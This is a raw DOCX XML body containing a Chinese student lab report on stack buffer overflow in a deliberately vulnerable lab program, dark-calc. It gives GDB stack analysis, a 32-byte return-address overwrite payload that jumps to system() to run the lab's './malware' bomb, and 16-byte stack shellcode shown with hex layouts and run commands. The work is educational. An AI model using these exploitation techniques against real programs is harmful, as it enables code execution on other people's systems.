            <w:tcW w:type="dxa" w:w="419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分配 16 字节缓冲区，buffer = rbp-0x10</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="113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执行 leave</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="13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leave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0x...0fe8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0x...0ff0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="419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rsp=rbp，弹出保存的 rbp；局部变量被丢弃</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="113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执行 ret</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="13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ret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0x...0ff0</w:t>
            </w:r>
          </w:p>
        </w:tc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0x...0ff0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="419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弹出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6"/>
              </w:rPr>
              <w:t>0x401ad1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到 rip，回到 main+14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5  call / prologue / leave / ret 的完整栈变化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归纳如下：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b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="A61B29"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>call</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：把返回地址（下一条指令的地址）压栈，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 -= 8</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>，然后跳转到被调函数；它是控制流转移和“返回地址入栈”的来源。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prologue：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push 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保存调用者的帧基址，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mov rbp, rsp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 建立当前帧，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sub rsp, n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为局部变量分配空间。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b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="A61B29"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>leave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mov rsp, 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丢弃局部变量，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pop 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恢复调用者的帧基址；它是 prologue 的逆操作。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：从栈顶弹出返回地址到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rip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 += 8</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>，控制流回到调用者。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这四步合起来保证了函数调用可以嵌套：每一层都有自己的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和返回地址，返回时按后进先出的顺序恢复。也正因为返回地址就放在缓冲区高地址方向，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的越界写才能直接改写它。</w:t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3  缓冲区溢出与长度实验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3.1  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="A61B29"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>MAXLEN + 1</w:t>
      </w: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 中的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="A61B29"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>+1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expression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声明为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char expression[MAXLEN + 1]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MAXLEN = 15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，所以数组是 16 字节。C 字符串以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\0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 结尾；15 个有效字符加 1 个终止符正好 16 字节。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在读完一行后会自动补上这个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\0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>，因此它实际写入的字节数总是“输入字符数 + 1”。这也就解释了为什么输入 20 个字符会写 21 字节、输入 32 个字符会写 33 字节。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3.2  20 与 32 个字符的实测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 返回后（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0x40199f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">）下断点，观察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rbp-0x10</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 开始的栈：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  <w:cantSplit/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="96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输入</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="96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gets 写入</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="249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被覆盖的区域</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3345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GDB 观察到的关键值</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417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运行结果</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr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 × 'A'</w:t>
            </w:r>
          </w:p>
        </w:tc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 字节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 字节 buffer + 保存 rbp 的低 5 字节</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="334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[rbp] = 0x0000720041414141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[rbp+8]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仍为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0x401ad1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="141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返回地址未变，程序继续运行，退出码 0</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr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 × 'A'</w:t>
            </w:r>
          </w:p>
        </w:tc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 字节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 字节 buffer + 8 字节保存 rbp + 8 字节返回地址</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="334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[rbp] = 0x4141414141414141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[rbp+8] = 0x4141414141414141</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="141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ret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跳到非法地址，SIGSEGV，退出码 139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6  不同长度输入对栈帧的破坏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20 字符时，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 把保存的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改成了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0x0000720041414141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，但返回地址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0x401ad1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 还在。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leave</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 会把这个坏值弹回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，不过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随后调用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prologue 会重新建立自己的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>，所以程序没有立刻崩溃。实际运行输出为：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Enter an expression (length up to 15):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Enter an expression (length up to 15):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42_is_The_Ànswer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4  20 字符输入的实际输出（stdout 缓冲导致 “0” 出现在提示符之前）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这里的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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来自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拼出的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echo $((AAAAAAAAAAAAAAA))</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：bash 的算术扩展把未定义变量名当作 0。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只取前 15 个字符，所以 20 个 A 中有 15 个进入了表达式。之后程序读到 EOF，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打印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42_is_The_Ànswer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 并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exit(0)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，因此坏掉的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没有机会被用来返回。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32 字符时，保存的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和返回地址都被 8 个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0x41</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 覆盖，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直接跳到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0x4141414141414141</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>，进程收到 SIGSEGV。由于 stdout 是缓冲的，崩溃前没有任何输出，终端只看到退出码 139。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3.3  超量数据到底写到了哪里？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gets(expression)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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rbp-0x10</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 开始向高地址写，写入顺序是：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低地址                                                          高地址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+------------------+------------------+------------------+------------------+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| expression[16]   | 保存的 rbp (8B)  | 返回地址 (8B)    | main 的栈帧 ...  |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| rbp-0x10         | rbp+0x00         | rbp+0x08         | rbp+0x10         |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+------------------+------------------+------------------+------------------+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 xml:space="preserve">        ^ 正常写入上限        ^ 20 字符越界到这里   ^ 32 字符越界到这里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5  缓冲区与相邻栈数据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这正是栈缓冲区溢出的本质：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 不知道目标缓冲区有多大，只要输入还没遇到换行或 EOF，就会一直向高地址写，依次覆盖保存的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>、返回地址，甚至调用者的栈帧。</w:t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4  任务一：利用缓冲区漏洞执行 ./malware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4.1  攻击思路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由第 2 节可知，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的缓冲区在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rbp-0x10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，保存的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，返回地址在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rbp+8</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">。因此填充 16 字节缓冲区、8 字节假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后，接下来的 8 字节就是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要弹出的地址。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程序本身已经提供了执行命令的代码：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eval()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0x401a6b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 处执行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mov edi, 0x6030d0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command_buf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的地址），紧接着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call system@plt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">。如果直接把返回地址改成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0x401a6b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，就跳过了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prologue 和拼接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echo $((...))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的逻辑，直接以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command_buf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为参数调用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system()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还需要让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command_buf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里恰好是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./malware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之后会执行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strcpy(command_buf, expression)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color w:val="A61B29"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>strcpy</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 遇到第一个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\0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 就停止。因此只要在缓冲区开头写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./malware\0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，后面的填充字节就不会被复制进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command_buf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4.2  payload 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96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偏移</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="96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长度</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3515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742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351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./malware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要执行的命令</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr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1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00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让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strcpy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在此停止</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr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51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A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× 6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填满 16 字节 buffer</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr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51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B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× 8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覆盖保存的 rbp（值不重要）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr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</w:t>
            </w:r>
          </w:p>
        </w:tc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51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6b 1a 40 00 00 00 00 00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覆盖返回地址为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0x401a6b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7  payload.py 的布局（共 32 字节）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00000000: 2e2f 6d61 6c77 6172 6500 4141 4141 4141  ./malware.AAAAAA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00000010: 4242 4242 4242 4242 6b1a 4000 0000 0000  BBBBBBBBk.@.....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6  payload.py 的十六进制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4.3  为什么能成功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rbp+8</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 弹出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0x401a6b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">，CPU 直接跳到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eval+0x94</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>。此时：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b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="A61B29"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>command_buf = "./malware"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，因为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strcpy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\0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 处停止；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b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="A61B29"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>rdi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 即将被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mov edi, 0x6030d0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置为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command_buf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的地址；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b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="A61B29"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>call system@plt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 会执行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/bin/sh -c "./malware"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GDB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0x401a6b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 处确认了这一点：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Breakpoint 1, 0x0000000000401a6b in eval ()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rip = 0x401a6b   rdi = 0x6030d0   rsp = 0x721000800ff0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(gdb) x/s 0x6030d0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0x6030d0 &lt;command_buf&gt;: "./malware"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7  跳转到 system 调用点时的现场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4.4  验证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attack/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录中运行（这样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./malware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才能被 shell 找到）：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cd AttackLab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python3 payload.py &gt; /tmp/payload.bin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(cd attack &amp;&amp; ./dark-calc &lt; /tmp/payload.bin)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8  任务一的复现命令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stdout 中出现了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malware</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 打印的父进程链和成功信息：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### The bomb was triggered by the dark-calc process. ###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### You have successfully detonated the bomb! Congratulations! ###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9  任务一的成功输出（节选）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pstree</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 显示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dark-calc -&gt; sh -c -- ./malware -&gt; malware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，说明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malware</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 确实是由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dark-calc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 进程触发的，而不是在外部单独运行。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BF9000"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tblBorders>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9184"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="9184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说明：本 payload 在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system()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返回后会因为跳过了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eval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的 prologue 而崩溃（退出码 135）。这不影响任务要求：成功信息已经在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system()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执行期间写入 stdout。模板 workflow 只检查 stdout 中是否包含指定字符串，因此该 payload 可以通过。若希望进程优雅退出，可以进一步构造一个假的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eval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栈帧，但这会让 payload 明显变长，且对本任务没有必要。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5  任务二：在固定栈上执行 shellcode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5.1  “楚门的世界”：固定且可执行的栈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dark-calc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init_fixed_stack()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之前执行，用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mmap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在固定地址建立了一块栈：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mmap(0x721000000000, 0x802000, PROT_READ|PROT_WRITE|PROT_EXEC,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 xml:space="preserve">     MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED_NOREPLACE, -1, 0);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mprotect(base, 0x1000, PROT_NONE);          // 底部 guard page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mprotect(base + 0x801000, 0x1000, PROT_NONE); // 顶部 guard page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fixed_stack_top = base + 0x801000;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10  init_fixed_stack 的关键逻辑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0x100022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MAP_PRIVATE(0x2) | MAP_ANONYMOUS(0x20) | MAP_FIXED_NOREPLACE(0x100000)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7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PROT_READ | PROT_WRITE | PROT_EXEC</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">。顶部地址为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0x721000000000 + 0x801000 = 0x721000801000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  <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="A61B29"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>__wrap_main()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在调用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前把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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 切到 这个值，因此整个调用链的栈地址是确定的。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逐层计算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的帧：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fixed_stack_top              = 0x721000801000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__wrap_main: call main       -&gt; rsp = top - 0x08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main: push rbp               -&gt; rbp = top - 0x10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main: call input             -&gt; rsp = top - 0x18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input: push rbp              -&gt; rbp = top - 0x20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input: sub rsp, 0x10         -&gt; rsp = top - 0x30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input: buffer = rbp - 0x10   -&gt; 0x721000800fd0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11  input 缓冲区的固定地址推导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GDB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input+8</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 处实测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 = 0x721000800fe0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buffer = rbp - 0x10 = 0x721000800fd0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>，与推导一致。这个地址就是 shellcode 的落点，也是覆盖后的返回地址。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5.2  16 字节 shellcode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缓冲区只有 16 字节，shellcode 必须非常紧凑。目标只是调用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grade_eval(4)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">，然后让程序回到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正常结束。构造如下：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机器码</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="255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汇编</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4252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bf 04 00 00 00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="255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mov edi, 4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="425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第一个参数 grade = 4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68 c3 1a 40 00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="255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push 0x401ac3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="425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 main 压栈，作为 grade_eval 的返回地址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68 87 1a 40 00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="255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push 0x401a87</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="425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 grade_eval 压栈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c3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="255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ret</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="425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弹出 grade_eval，进入函数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8  payload_dark.py 的 16 字节 shellcode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这里没有使用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call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，因为栈地址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0x721000800fd0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与代码段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0x401a87</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 相距约 0x720f...，超出了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call rel32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±2 GB 范围；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push imm32; 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可以先把 64 位目标地址压栈，再用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跳过去，不受相对位移限制。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两次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push</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 还有一个附带好处：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 = 0x721000800ff0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">（16 字节对齐），两次 push 把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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 变成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0x...0fe0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弹出后又回到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0x...0fe8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，即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8 mod 16</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>。这正好满足 SysV ABI 对函数入口的栈对齐要求，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内部的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printf</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 不会因为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movaps</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 对齐问题崩溃。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5.3  payload 与验证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96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偏移</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="96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长度</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3742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515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上述 shellcode</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="351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在栈上执行</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr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× 8</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="351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假 saved rbp</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr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</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="96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d0 0f 80 00 10 72 00 00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3515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返回地址 =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0x721000800fd0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9  payload_dark.py 的布局（共 32 字节）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GDB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入口处实测：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rdi = 4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 = 0x721000800fe8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8 mod 16</w:t>
      </w:r>
      <w:r>
        <w:rPr>
